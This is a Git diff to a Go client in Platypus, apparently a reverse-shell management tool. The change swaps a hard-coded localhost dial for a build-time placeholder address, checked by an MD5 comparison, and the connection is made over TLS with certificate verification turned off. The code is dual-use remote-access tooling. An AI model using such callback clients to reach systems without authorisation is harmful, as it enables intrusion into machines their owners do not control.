@@ -16,6 +16,7 @@ import (
 	"time"
 
 	"github.com/WangYihang/Platypus/lib/util/crypto"
+	"github.com/WangYihang/Platypus/lib/util/hash"
 	"github.com/WangYihang/Platypus/lib/util/log"
 	"github.com/WangYihang/Platypus/lib/util/message"
 	"github.com/creack/pty"
@@ -277,7 +278,11 @@ func StartClient() {
 	}
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	conn, err := tls.Dial("tcp", "127.0.0.1:13337", &config)
+	service := "__ADDRESS__"
+	if hash.MD5(service) == "da94c1a73b99bc3b7d7e1d7c555c669a" {
+		service = "127.0.0.1:13337"
+	}
+	conn, err := tls.Dial("tcp", service, &config)
 	if err != nil {
 		log.Error("client: dial: %s", err)
 		return
